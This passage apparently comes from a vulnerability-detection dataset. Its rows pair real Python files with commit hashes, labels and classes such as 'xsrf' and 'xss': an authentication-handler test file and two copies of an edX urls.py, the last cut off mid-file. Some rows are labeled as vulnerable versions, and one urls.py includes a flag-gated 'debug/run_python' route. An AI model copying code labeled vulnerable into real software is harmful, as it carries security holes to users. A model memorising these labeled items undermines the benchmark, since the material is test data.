    token = host_token.create_host_token('HOST.domain.com', expiration_sec=60)
    self.mock_now(origin, 61)
    self.assertEqual('<none>', call({'X-Host-Token-V1': token}))

  def test_delegation_token(self):
    peer_ident = model.Identity.from_bytes('user:peer@a.com')

    class Handler(handler.AuthenticatingHandler):
      @classmethod
      def get_auth_methods(cls, conf):
        return [lambda _request: peer_ident]

      @api.public
      def get(self):
        self.response.write(json.dumps({
          'peer_id': api.get_peer_identity().to_bytes(),
          'cur_id': api.get_current_identity().to_bytes(),
        }))

    app = self.make_test_app('/request', Handler)
    def call(headers=None):
      return json.loads(app.get('/request', headers=headers).body)

    # No delegation.
    self.assertEqual(
        {u'cur_id': u'user:peer@a.com', u'peer_id': u'user:peer@a.com'}, call())

    # TODO(vadimsh): Mint token via some high-level function call.
    subtokens = delegation_pb2.SubtokenList(subtokens=[
        delegation_pb2.Subtoken(
            issuer_id='user:delegated@a.com',
            creation_time=int(utils.time_time()),
            validity_duration=3600),
    ])
    tok = delegation.serialize_token(delegation.seal_token(subtokens))

    # With valid delegation token.
    self.assertEqual(
        {u'cur_id': u'user:delegated@a.com', u'peer_id': u'user:peer@a.com'},
        call({'X-Delegation-Token-V1': tok}))

    # With invalid delegation token.
    r = app.get(
        '/request',
        headers={'X-Delegation-Token-V1': tok + 'blah'},
        expect_errors=True)
    self.assertEqual(403, r.status_int)

    # Transient error.
    def mocked_check(*_args):
      raise delegation.TransientError('Blah')
    self.mock(delegation, 'check_delegation_token', mocked_check)
    r = app.get(
        '/request',
        headers={'X-Delegation-Token-V1': tok},
        expect_errors=True)
    self.assertEqual(500, r.status_int)


class GaeCookieAuthenticationTest(test_case.TestCase):
  """"""Tests for gae_cookie_authentication function.""""""

  def test_non_applicable(self):
    self.assertIsNone(handler.gae_cookie_authentication(webapp2.Request({})))

  def test_applicable(self):
    os.environ.update({
      'USER_EMAIL': 'joe@example.com',
      'USER_ID': '123',
      'USER_IS_ADMIN': '0',
    })
    # Actual request is not used by CookieAuthentication.
    self.assertEqual(
        model.Identity(model.IDENTITY_USER, 'joe@example.com'),
        handler.gae_cookie_authentication(webapp2.Request({})))


class ServiceToServiceAuthenticationTest(test_case.TestCase):
  """"""Tests for service_to_service_authentication.""""""

  def test_non_applicable(self):
    request = webapp2.Request({})
    self.assertIsNone(
        handler.service_to_service_authentication(request))

  def test_applicable(self):
    request = webapp2.Request({
      'HTTP_X_APPENGINE_INBOUND_APPID': 'some-app',
    })
    self.assertEqual(
      model.Identity(model.IDENTITY_SERVICE, 'some-app'),
      handler.service_to_service_authentication(request))


if __name__ == '__main__':
  if '-v' in sys.argv:
    unittest.TestCase.maxDiff = None
  unittest.main()
/n/n/n",1,xsrf
0,34,5fad9ccca43cdfb565b3f80914f998afa7f2fa78,"lms/urls.py/n/nfrom django.conf import settings
from django.conf.urls import patterns, include, url
from django.contrib import admin
from django.conf.urls.static import static

# Not used, the work is done in the imported module.
from . import one_time_startup      # pylint: disable=W0611

import django.contrib.auth.views

# Uncomment the next two lines to enable the admin:
if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    admin.autodiscover()

urlpatterns = ('',  # nopep8
    # certificate view

    url(r'^update_certificate$', 'certificates.views.update_certificate'),
    url(r'^$', 'branding.views.index', name=""root""),   # Main marketing page, or redirect to courseware
    url(r'^dashboard$', 'student.views.dashboard', name=""dashboard""),
    url(r'^login$', 'student.views.signin_user', name=""signin_user""),
    url(r'^register$', 'student.views.register_user', name=""register_user""),

    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),

    url(r'^change_email$', 'student.views.change_email_request', name=""change_email""),
    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),
    url(r'^change_name$', 'student.views.change_name_request', name=""change_name""),
    url(r'^accept_name_change$', 'student.views.accept_name_change'),
    url(r'^reject_name_change$', 'student.views.reject_name_change'),
    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),
    url(r'^event$', 'track.views.user_track'),
    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?

    url(r'^accounts/login$', 'student.views.accounts_login', name=""accounts_login""),

    url(r'^login_ajax$', 'student.views.login_user', name=""login""),
    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),
    url(r'^logout$', 'student.views.logout_user', name='logout'),
    url(r'^create_account$', 'student.views.create_account', name='create_account'),
    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=""activate""),

    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=""begin_exam_registration""),
    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),

    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),
    ## Obsolete Django views for password resets
    ## TODO: Replace with Mako-ized views
    url(r'^password_change/$', django.contrib.auth.views.password_change,
        name='auth_password_change'),
    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,
        name='auth_password_change_done'),
    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',
        'student.views.password_reset_confirm_wrapper',
        name='auth_password_reset_confirm'),
    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,
        name='auth_password_reset_complete'),
    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,
        name='auth_password_reset_done'),

    url(r'^heartbeat$', include('heartbeat.urls')),
)

# University profiles only make sense in the default edX context
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        ##
        ## Only universities without courses should be included here.  If
        ## courses exist, the dynamic profile rule below should win.
        ##
        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'WellesleyX'}),
        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'McGillX'}),
        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'TorontoX'}),
        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'RiceX'}),
        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'ANUx'}),
        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'EPFLx'}),

        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',
            name=""university_profile""),
    )

#Semi-static views (these need to be rendered and have the login bar, but don't change)
urlpatterns += (
    url(r'^404$', 'static_template_view.views.render',
        {'template': '404.html'}, name=""404""),
)

# Semi-static views only used by edX, not by themes
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        url(r'^jobs$', 'static_template_view.views.render',
            {'template': 'jobs.html'}, name=""jobs""),
        url(r'^press$', 'student.views.press', name=""press""),
        url(r'^media-kit$', 'static_template_view.views.render',
            {'template': 'media-kit.html'}, name=""media-kit""),
        url(r'^faq$', 'static_template_view.views.render',
            {'template': 'faq.html'}, name=""faq_edx""),
        url(r'^help$', 'static_template_view.views.render',
            {'template': 'help.html'}, name=""help_edx""),

        # TODO: (bridger) The copyright has been removed until it is updated for edX
        # url(r'^copyright$', 'static_template_view.views.render',
        #     {'template': 'copyright.html'}, name=""copyright""),

        #Press releases
        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),

        # Favicon
        (r'^favicon\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),

        url(r'^submit_feedback$', 'util.views.submit_feedback'),

    )

# Only enable URLs for those marketing links actually enabled in the
# settings. Disable URLs by marking them as None.
for key, value in settings.MKTG_URL_LINK_MAP.items():
    # Skip disabled URLs
    if value is None:
        continue

    # These urls are enabled separately
    if key == ""ROOT"" or key == ""COURSES"" or key == ""FAQ"":
        continue

    # Make the assumptions that the templates are all in the same dir
    # and that they all match the name of the key (plus extension)
    template = ""%s.html"" % key.lower()

    # To allow theme templates to inherit from default templates,
    # prepend a standard prefix
    if settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
        template = ""theme-"" + template

    # Make the assumption that the URL we want is the lowercased
    # version of the map key
    urlpatterns += (url(r'^%s' % key.lower(),
                        'static_template_view.views.render',
                        {'template': template}, name=value),)


if settings.PERFSTATS:
    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)

# Multicourse wiki (Note: wiki urls must be above the courseware ones because of
# the custom tab catch-all)
if settings.WIKI_ENABLED:
    from wiki.urls import get_pattern as wiki_pattern
    from django_notify.urls import get_pattern as notify_pattern

    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update
    # them together.
    urlpatterns += (
        # First we include views from course_wiki that we use to override the default views.
        # They come first in the urlpatterns so they get resolved first
        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),
        url(r'^wiki/', include(wiki_pattern())),
        url(r'^notify/', include(notify_pattern())),

        # These urls are for viewing the wiki in the context of a course. They should
        # never be returned by a reverse() so they come after the other url patterns
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',
            'course_wiki.views.course_wiki_redirect', name=""course_wiki""),
        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),
    )


if settings.COURSEWARE_ENABLED:
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',
            'courseware.views.jump_to', name=""jump_to""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.modx_dispatch',
            name='modx_dispatch'),


        # Software Licenses

        # TODO: for now, this is the endpoint of an ajax replay
        # service that retrieve and assigns license numbers for
        # software assigned to a course. The numbers have to be loaded
        # into the database.
        url(r'^software-licenses$', 'licenses.views.user_software_license', name=""user_software_license""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.xqueue_callback',
            name='xqueue_callback'),
        url(r'^change_setting$', 'student.views.change_setting',
            name='change_setting'),

        # TODO: These views need to be updated before they work
        url(r'^calculate$', 'util.views.calculate'),
        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki
        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),
        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),

        url(r'^courses/?$', 'branding.views.courses', name=""courses""),
        url(r'^change_enrollment$',
            'student.views.change_enrollment', name=""change_enrollment""),

        #About the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',
            'courseware.views.course_about', name=""about_course""),
        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),
        #View for mktg site
        url(r'^mktg/(?P<course_id>.*)$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),



        #Inside the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'courseware.views.course_info', name=""course_root""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',
            'courseware.views.course_info', name=""info""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',
            'courseware.views.syllabus', name=""syllabus""),   # TODO arjun remove when custom tabs in place, see courseware/courses.py
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\d+)/$',
            'staticbook.views.index', name=""book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\d+)/(?P<page>\d+)$',
            'staticbook.views.index'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/(?P<page>\d+)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/(?P<page>\d+)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\d+)/$',
            'staticbook.views.html_index', name=""html_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/$',
            'staticbook.views.html_index', name=""html_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',
            'courseware.views.index', name=""courseware""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',
            'courseware.views.index', name=""courseware_chapter""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',
            'courseware.views.index', name=""courseware_section""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',
            'courseware.views.index', name=""courseware_position""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',
            'courseware.views.progress', name=""progress""),
        # Takes optional student_id for instructor use--shows profile as that student sees it.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',
            'courseware.views.progress', name=""student_progress""),

        # For the instructor
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',
            'instructor.views.instructor_dashboard', name=""instructor_dashboard""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',
            'instructor.views.gradebook', name='gradebook'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',
            'instructor.views.grade_summary', name='grade_summary'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',
            'open_ended_grading.views.staff_grading', name='staff_grading'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',
            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',
            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),

        # Open Ended problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',
            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),

        # Open Ended flagged problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',
            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',
            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),

        # Cohorts management
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',
            'course_groups.views.list_cohorts', name=""cohorts""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',
            'course_groups.views.add_cohort',
            name=""add_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',
            'course_groups.views.users_in_cohort',
            name=""list_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',
            'course_groups.views.add_users_to_cohort',
            name=""add_to_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',
            'course_groups.views.remove_user_from_cohort',
            name=""remove_from_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',
            'course_groups.views.debug_cohort_mgmt',
            name=""debug_cohort_mgmt""),

        # Open Ended Notifications
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',
            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',
            'open_ended_grading.views.peer_grading', name='peer_grading'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),

    )

    # allow course staff to change to student view of courseware
    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):
        urlpatterns += (
            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=""masquerade-switch""),
        )

    # discussion forums live within courseware, so courseware must be enabled first
    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',
                'courseware.views.news', name=""news""),
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',
                include('django_comment_client.urls'))
        )
    urlpatterns += (
        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',
        'courseware.views.static_tab', name=""static_tab""),
    )

    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',
                'courseware.views.submission_history',
                name='submission_history'),
        )


if settings.ENABLE_JASMINE:
    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)

if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    ## Jasmine and admin
    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)

if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):
    urlpatterns += (
        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),
        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),
        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),
    )

if settings.MITX_FEATURES.get('AUTH_USE_SHIB'):
    urlpatterns += (
        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),
    )

if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):
    urlpatterns += (
        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_login', name='course-specific-login'),
        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_register', name='course-specific-register'),

    )


if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):
    urlpatterns += (
        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),
        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),
        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),
        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')
    )

if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):
    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),

if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):
    urlpatterns += (
        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),
        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),
    )

if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):
    urlpatterns += (
        url(r'^event_logs$', 'track.views.view_tracking_log'),
        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),
    )

if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):
    urlpatterns += (
        url(r'^status/', include('service_status.urls')),
    )

if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):
    urlpatterns += (
        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),
    )

if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):
    urlpatterns += (
        url(r'^edinsights_service/', include('edinsights.core.urls')),
    )
    import edinsights.core.registry

# FoldIt views
urlpatterns += (
    # The path is hardcoded into their app...
    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=""foldit_ops""),
)

if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):
    urlpatterns += (
        url(r'^debug/run_python', 'debug.views.run_python'),
    )

# Crowdsourced hinting instructor manager.
if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',
            'instructor.hint_manager.hint_manager', name=""hint_manager""),
    )

urlpatterns = patterns(*urlpatterns)

if settings.DEBUG:
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)

#Custom error pages
handler404 = 'static_template_view.views.render_404'
handler500 = 'static_template_view.views.render_500'
/n/n/n",0,xss
1,35,5fad9ccca43cdfb565b3f80914f998afa7f2fa78,"/lms/urls.py/n/nfrom django.conf import settings
from django.conf.urls import patterns, include, url
from django.contrib import admin
from django.conf.urls.static import static

# Not used, the work is done in the imported module.
from . import one_time_startup      # pylint: disable=W0611

import django.contrib.auth.views

# Uncomment the next two lines to enable the admin:
if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    admin.autodiscover()

urlpatterns = ('',  # nopep8
    # certificate view

    url(r'^update_certificate$', 'certificates.views.update_certificate'),
    url(r'^$', 'branding.views.index', name=""root""),   # Main marketing page, or redirect to courseware
    url(r'^dashboard$', 'student.views.dashboard', name=""dashboard""),
    url(r'^login$', 'student.views.signin_user', name=""signin_user""),
    url(r'^register$', 'student.views.register_user', name=""register_user""),

    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),

    url(r'^change_email$', 'student.views.change_email_request', name=""change_email""),
    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),
    url(r'^change_name$', 'student.views.change_name_request', name=""change_name""),
    url(r'^accept_name_change$', 'student.views.accept_name_change'),
    url(r'^reject_name_change$', 'student.views.reject_name_change'),
    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),
    url(r'^event$', 'track.views.user_track'),
    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?

    url(r'^accounts/login$', 'student.views.accounts_login', name=""accounts_login""),

    url(r'^login_ajax$', 'student.views.login_user', name=""login""),
    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),
    url(r'^logout$', 'student.views.logout_user', name='logout'),
    url(r'^create_account$', 'student.views.create_account', name='create_account'),
    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=""activate""),

    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=""begin_exam_registration""),
    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),

    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),
    ## Obsolete Django views for password resets
    ## TODO: Replace with Mako-ized views
    url(r'^password_change/$', django.contrib.auth.views.password_change,
        name='auth_password_change'),
    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,
        name='auth_password_change_done'),
    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',
        'student.views.password_reset_confirm_wrapper',
        name='auth_password_reset_confirm'),
    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,
        name='auth_password_reset_complete'),
    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,
        name='auth_password_reset_done'),

    url(r'^heartbeat$', include('heartbeat.urls')),
)

# University profiles only make sense in the default edX context
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        ##
        ## Only universities without courses should be included here.  If
        ## courses exist, the dynamic profile rule below should win.
        ##
        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'WellesleyX'}),
        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'McGillX'}),
        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'TorontoX'}),
        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'RiceX'}),
        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'ANUx'}),
        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'EPFLx'}),

        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',
            name=""university_profile""),
    )

#Semi-static views (these need to be rendered and have the login bar, but don't change)
urlpatterns += (
    url(r'^404$', 'static_template_view.views.render',
        {'template': '404.html'}, name=""404""),
)

# Semi-static views only used by edX, not by themes
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        url(r'^jobs$', 'static_template_view.views.render',
            {'template': 'jobs.html'}, name=""jobs""),
        url(r'^press$', 'student.views.press', name=""press""),
        url(r'^media-kit$', 'static_template_view.views.render',
            {'template': 'media-kit.html'}, name=""media-kit""),
        url(r'^faq$', 'static_template_view.views.render',
            {'template': 'faq.html'}, name=""faq_edx""),
        url(r'^help$', 'static_template_view.views.render',
            {'template': 'help.html'}, name=""help_edx""),

        # TODO: (bridger) The copyright has been removed until it is updated for edX
        # url(r'^copyright$', 'static_template_view.views.render',
        #     {'template': 'copyright.html'}, name=""copyright""),

        #Press releases
        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),

        # Favicon
        (r'^favicon\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),

        url(r'^submit_feedback$', 'util.views.submit_feedback'),

    )

# Only enable URLs for those marketing links actually enabled in the
# settings. Disable URLs by marking them as None.
for key, value in settings.MKTG_URL_LINK_MAP.items():
    # Skip disabled URLs
    if value is None:
        continue

    # These urls are enabled separately
    if key == ""ROOT"" or key == ""COURSES"" or key == ""FAQ"":
        continue

    # Make the assumptions that the templates are all in the same dir
    # and that they all match the name of the key (plus extension)
    template = ""%s.html"" % key.lower()

    # To allow theme templates to inherit from default templates,
    # prepend a standard prefix
    if settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
        template = ""theme-"" + template

    # Make the assumption that the URL we want is the lowercased
    # version of the map key
    urlpatterns += (url(r'^%s' % key.lower(),
                        'static_template_view.views.render',
                        {'template': template}, name=value),)


if settings.PERFSTATS:
    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)

# Multicourse wiki (Note: wiki urls must be above the courseware ones because of
# the custom tab catch-all)
if settings.WIKI_ENABLED:
    from wiki.urls import get_pattern as wiki_pattern
    from django_notify.urls import get_pattern as notify_pattern

    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update
    # them together.
    urlpatterns += (
        # First we include views from course_wiki that we use to override the default views.
        # They come first in the urlpatterns so they get resolved first
        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),
        url(r'^wiki/', include(wiki_pattern())),
        url(r'^notify/', include(notify_pattern())),

        # These urls are for viewing the wiki in the context of a course. They should
        # never be returned by a reverse() so they come after the other url patterns
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',
            'course_wiki.views.course_wiki_redirect', name=""course_wiki""),
        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),
    )


if settings.COURSEWARE_ENABLED:
    urlpatterns += (
